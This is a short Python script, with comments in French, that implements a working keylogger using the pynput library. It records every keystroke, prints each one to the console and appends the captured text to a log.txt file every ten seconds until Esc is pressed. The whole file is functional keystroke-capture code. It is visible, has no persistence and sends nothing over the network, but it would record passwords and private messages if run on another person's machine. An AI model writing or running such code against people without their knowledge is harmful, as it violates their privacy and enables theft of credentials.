import os
import threading
from pynput.keyboard import Listener

log_list = []
path = os.path.join(os.getcwd(), "log.txt") 

if not os.path.exists(path):
    open(path, "w").close()

def process_keys(key):
    """Capture les touches pressées et les enregistre dans la liste log_list."""
    global log_list
    print(f"Touche pressée: {key}")
    
    try:
        log_list.append(key.char)
    except AttributeError:
        if key == key.space:
            log_list.append(" ")
        elif key == key.enter:
            log_list.append("\n")
        elif key == key.backspace and log_list:
            log_list.pop()
        elif key == key.esc:
            print("[INFO] Arrêt du keylogger...")
            return False
        else:
            log_list.append(f"[{key}]")

def report():
    """Enregistre les touches pressées dans un fichier toutes les 10 secondes."""
    global log_list, path
    
    if log_list:
        with open(path, "a") as logfile:
            logfile.write("".join(log_list))
            logfile.flush()
            print(f"[LOGGING] Données enregistrées : {''.join(log_list)}")
            log_list = []
    
    timer = threading.Timer(10, report)
    timer.start()

with Listener(on_press=process_keys) as keyboard_listener:
    report()
    keyboard_listener.join()